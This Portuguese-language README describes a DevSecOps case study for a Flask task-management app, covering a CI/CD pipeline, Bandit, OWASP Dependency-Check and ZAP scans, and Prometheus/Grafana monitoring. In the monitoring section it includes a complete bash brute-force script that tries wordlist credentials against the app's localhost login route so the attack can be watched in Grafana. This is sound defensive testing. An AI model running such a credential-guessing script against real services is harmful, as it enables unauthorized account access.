## INTRODUÇÃO

Este estudo de caso se refere a implementação e segurança de um sistema de gerenciamento de tarefas pessoais, integrando processos de SDLC, DevOps e DevSecOps para garantir eficiência e segurança.
<hr>


### ETAPA 1: PLANEJAMENTO E DEFINIÇÃO DE REQUISITOS

1. Clonar o projeto e instalar das dependências a partir do requiriments.txt:

```
Flask==2.3.2
Flask-Bcrypt==1.0.1
Flask-Login==0.6.3
Flask-SQLAlchemy==3.0.5
Flask-WTF==1.1.1
WTForms==3.1.1
Jinja2==3.1.2
werkzeug==2.3.3
coverage
python-dotenv
prometheus-flask-exporter
```
<br />

2. Construir o diagrama para entender o domínio do problema:

![dfd](https://github.com/user-attachments/assets/6809cba3-bd94-4042-beb3-96beb5435c44)

<hr>

### ETAPA 2: DESENVOLVIMENTO DO SISTEMA

**Branches:**
- `master`: produção  
- `development`: desenvolvimento  
- `staging`: homologação

**Ferramentas Utilizadas:**
- Visual Studio Code
- GitLab
- Docker
- Python
- Pytest
- Unittest
- Zed Attack Proxy
- Bandit
- OWASP Dependency-Check
- OWASP ZAP
- Hydra
- Prometheus
- Grafana

1. Implementação do Dockerfile:

![dockerfile](https://github.com/user-attachments/assets/2c5f592a-185b-4f68-b372-33077d93eed0)


2. Aplicação executada na porta 5000:

   ![app](https://github.com/user-attachments/assets/815bb208-495e-4b0b-9931-5ea3d2c150e5)


<hr>

### ETAPA 3: IMPLEMENTAÇÃO DE UM PIPELINE CI/CD

1. Implementação do build e deploy na pipeline:

![gitlabci](https://github.com/user-attachments/assets/8d68bae7-73df-4b91-9e75-5c012a159177)


2. Pipeline em execução no GitLab:

![pipeline-initial](https://github.com/user-attachments/assets/de446dc6-f90a-4192-a62c-e58366d52a2c)


<hr>

### ETAPA 4: ANÁLISE ESTÁTICA DE CÓDIGO (SAST)

1. Implementação do Bandit na pipeline:
   
![bandit-artifect](https://github.com/user-attachments/assets/f6a7f30a-d20f-41cb-a541-b2c95c493182)


2. Artefato gerado mostrando dados sensíveis expostos na aplicação:

![artefact-zap-attack-tools](https://github.com/user-attachments/assets/92ed0c4f-d63e-4f4b-a281-3e8e05ded057)


3. Correção no código da falha capturada pelo Bandit:

![fixenv](https://github.com/user-attachments/assets/637a10d4-24c7-47de-8d1c-e91db4f988c0)


4. Implementação do OWASP Dependency Check na pipeline:
   
![owasp-dependecy-check](https://github.com/user-attachments/assets/03502964-4072-4e84-8c6b-45abab2dd431)


5. Artefato gerado com vulnerabilidades no código JavaScript:

![artifect-dependency-check](https://github.com/user-attachments/assets/c86fa7fb-8759-4973-af40-5e5877b0c09e)

<hr>

### ETAPA 5: ANÁLISE DINÂMICA DE SEGURANÇA (DAST)

1. Foi utilizada a aplicação Zed Attack Proxy (ZAP) para fazer uma varredura rápida na aplicação:

![zap-attack-tools](https://github.com/user-attachments/assets/96d41aad-6ea6-4780-b00f-a0060b2d3ac4)


2. Artefato gerado mostrando as vulnerabilidades e níveis de risco:
   
![artefact-zap-attack-tools](https://github.com/user-attachments/assets/0484436e-463d-4849-a0ef-25fd2e44ac00)

<hr>

### ETAPA 6: ENTREGA CONTÍNUA (CD)

1. Implementação da etapa de revisão de código na pipeline:

![review-pipeline](https://github.com/user-attachments/assets/935989ed-c41e-4851-8707-272e25f47020)


2. Implementação do OWASP ZAP para executar em toda a pipeline na homologação:


![owasp-zap](https://github.com/gustavomob/devsecops-taskmanager/tree/main/images/images/dast.png)
<hr>

### ETAPA 7: MONITORAMENTO

1. Implementação do Prometheus e Grafana na produção:
   
![grafana-prometheus](https://github.com/user-attachments/assets/b6f2439e-4504-4498-b854-dea651855d26)


2. Implementação do ataque de força bruta em bash:

```
#!/bin/bash

URL="http://localhost:5000/login"   
USERNAMES="usernames.txt"        
PASSWORDS="passwords.txt"       

if [[ ! -f "$USERNAMES" || ! -f "$PASSWORDS" ]]; then
  echo "Os arquivos usernames.txt ou passwords.txt não foram encontrados."
  exit 1
fi

while IFS= read -r username; do
  while IFS= read -r password; do
    echo "Tentando login com Username: $username e Password: $password"    
 
    response=$(curl -s -X POST -d "username=$username&password=$password" "$URL")    
   
    if [[ $response == *"Login successful"* ]]; then
      echo "SUCESSO! Username: $username | Password: $password"
      exit 0
    fi
  done < "$PASSWORDS"
done < "$USERNAMES"
```
<br />
   
3. Acompanhamento pelo Grafana com o ataque de bruta force em execução na rota de login:

![monitory](https://github.com/user-attachments/assets/eea67828-4ac5-4fc5-9e40-707d7ce3c3d8)

<hr>

### ETAPA 8: FEEDBACKS

1. A aplicação é antiga e precisou que algumas bibliotecas fossem atualizadas;
   
2. Foi corrigida uma das vulnerabilidades críticas capturada pelo bandit;
   
3. Testes funcionais e de integração foram implementados na etapa de homologação 
   
4. A pipeline foi testada de ponta a ponta, do desenvolvimento a homologação e produção:
   
![pipeline-finished](https://github.com/user-attachments/assets/e749eb7a-c885-4e95-b484-d77d6c24cd6d)



<br />
